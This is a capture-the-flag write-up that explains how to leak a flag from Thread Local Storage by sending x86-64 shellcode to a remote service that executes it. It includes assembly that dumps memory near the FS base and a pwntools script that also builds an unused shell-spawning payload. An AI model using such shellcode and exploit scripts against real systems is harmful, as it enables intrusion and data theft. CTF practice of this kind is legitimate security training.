
---

# Threads Challenge Writeup

## Challenge Overview

**Description:** The challenge provides a service that accepts and executes shellcode in an RWX mmapped region. No binary is provided.
**Hint:** The description emphasizes "Threads" and mentions that secrets are stored using `__thread` variables (Thread Local Storage).
**Flag Format:** The flag is split into 4-byte `unsigned int` chunks, with characters reversed within each chunk.

## Vulnerability Analysis

The core vulnerability is **Arbitrary Shellcode Execution**. However, the difficulty lies in locating the flag in memory without a binary to reverse engineer.

The key hint is the usage of `volatile __thread`. On Linux x86-64 systems, Thread Local Storage (TLS) is managed via the **FS segment register**.

* The `FS` register points to the **Thread Control Block (TCB)**.
* Local thread variables (like the flag chunks mentioned) are typically stored immediately **before** the address pointed to by `FS` (at negative offsets).

## Exploit Steps

### 1. Locate Thread Local Storage (TLS)

To access the TLS area, we need the linear address of the TCB. In x86-64 assembly, we cannot read the `FS` register directly to get the address, but the TCB contains a pointer to itself at `fs:[0]`.

### 2. Dump Memory

We construct shellcode to:

1. Read the TCB address from `fs:[0]`.
2. Subtract an offset (e.g., `0x200`) to point to the start of the TLS variables.
3. Perform a `sys_write` syscall to dump this memory region to `stdout`.

```assembly
/* 1. Get the address of the Thread Control Block (FS Base) */
mov rsi, qword ptr fs:[0]

/* 2. Move pointer back to cover TLS variables
      TLS data is located at negative offsets relative to FS base.
      0x200 is a safe heuristic range. */
sub rsi, 0x200

/* 3. Write memory to stdout (File Descriptor 1) */
mov rax, 1          /* sys_write */
mov rdi, 1          /* stdout */
mov rdx, 0x300      /* length to dump */
syscall

/* 4. Exit */
mov rax, 60
xor rdi, rdi
syscall

```

### 3. Reconstruct Flag

The output will be a raw memory dump. According to the description, the flag is stored as integers representing 4-character chunks, reversed.

**Example Dump Pattern:**
If the dump contains `... {CFT ...`, it corresponds to the chunk `volatile __thread unsigned int flag1 = '{CFT';`.

* Reversed: `TFC{`

We simply parse the dump for printable strings and reverse every 4-byte chunk to assemble the final flag.

## Exploit Script
Here is the final solution:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = remote('34.89.163.72', 31829)

shellcode_asm = """
    /* 1. Get the address of the Thread Control Block (FS Base) */
    mov rsi, qword ptr fs:[0]

    /* 2. Move back a SAFE amount (0x200 = 512 bytes).
       0x1000 was likely hitting unmapped memory.
       The flag is likely right next to the FS base. */
    sub rsi, 0x200

    /* 3. Dump 0x300 bytes.
       This reads from [FS-0x200] to [FS+0x100].
       This range covers the TLS variables (flag) and the TCB itself. */
    mov rax, 1          /* sys_write */
    mov rdi, 1          /* stdout */
    mov rdx, 0x300      /* length */
    syscall

    /* 4. Exit cleanly */
    mov rax, 60
    xor rdi, rdi
    syscall
"""

payload_leak_string = asm(shellcode_asm)
shellcode_asm_sh = shellcraft.sh()
payload = asm(shellcode_asm_sh)

print(io.recvuntil(b'shellcodez!!!\n').decode())

io.send(payload_leak_string)

output = io.recvall()

print(f"\n[+] Received {len(output)} bytes of dump.")


if len(output) > 0:
    print("\n[+] Hexdump around potential flag area:")
    print(hexdump(output))

    print("\n[+] Attempting to extract strings:")
    # Filter for printable strings to help spot the flag
    import re
    strings = re.findall(b'[ -~]{4,}', output)
    for s in strings:
        print(f"Found string: {s.decode(errors='ignore')}")
else:
    print("[-] Still no output. The offset might still be invalid or syscalls are restricted.")

io.close()
```